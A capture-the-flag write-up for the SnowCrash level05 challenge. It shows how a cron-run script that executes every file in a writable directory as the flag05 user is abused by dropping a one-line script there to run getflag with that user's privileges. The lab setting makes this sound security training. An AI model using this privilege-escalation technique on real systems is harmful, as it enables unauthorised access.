# LEVEL05

## Analysis
With the command ls -la we don't find much in our directory
```bash
        level05@SnowCrash:~$ ls -la
        total 12
        dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
        d--x--x--x  1 root    users    340 Aug 30  2015 ..
        -r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
        -r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
        -r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

Therefore let's try to use the command find for the flag05
```bash
        level05@SnowCrash:~$ find / -user flag05 2>/dev/null
        /usr/sbin/openarenaserver
        /rofs/usr/sbin/openarenaserver
```

Great we found two files! Let's see the rights and what is inside if we can read them.
```bash
        level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
        -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
        level05@SnowCrash:~$ ls -la /rofs/usr/sbin/openarenaserver
        -rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
        level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
        #!/bin/sh

        for i in /opt/openarenaserver/* ; do
                (ulimit -t 5; bash -x "$i")
                rm -f "$i"
        done
```

## Solution

Ok we have a script that runs every file in /opt/openarenaserver/* as flag05 (bash -x "$i") and then deletes it.
That means if you (level05) can place a file in /opt/openarenaserver/, it will be executed as flag05 on the next
cron run with flag05 privileges.
```bash
        level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
        level05@SnowCrash:~$ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        level05@SnowCrash:~$ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        level05@SnowCrash:~$ cat /tmp/flag
        cat: /tmp/flag: No such file or directory
        level05@SnowCrash:~$ cat /tmp/flag
        Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```
